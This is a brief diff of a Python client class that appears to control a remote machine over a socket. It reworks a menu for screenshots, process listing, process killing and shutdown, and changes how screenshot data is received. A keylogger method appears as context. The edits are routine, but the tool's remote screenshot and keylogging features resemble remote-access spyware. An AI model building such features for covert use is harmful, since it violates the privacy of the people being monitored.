@@ -45,12 +45,12 @@ class Client:
 
   def run(self):
     while True:
-      cmd = input('''Enter command: 
+      print('''Commands: 
       1: Take screenshot
       2: View processes
       3: Kill process
-      4: Shutdown
-      ''')
+      4: Shutdown''')
+      cmd = input('Enter command: ')
       if cmd == '1':
         self.take_screenshot()
         self.receive_image()
@@ -74,9 +74,10 @@ class Client:
     with open(os.path.join(SCREENSHOT_PATH, 'screenshot.png'), 'wb') as f:
       while True:
         data = self.socket.recv(BUFFER_SIZE)
-        if not data:
+        if data == b'IMAGE_END':
           break
-        f.write(data)
+        else:
+          f.write(data)
 
   def key_logger(self):
     with open(os.path.join(SCREENSHOT_PATH, 'keylog.txt'), 'w') as f:
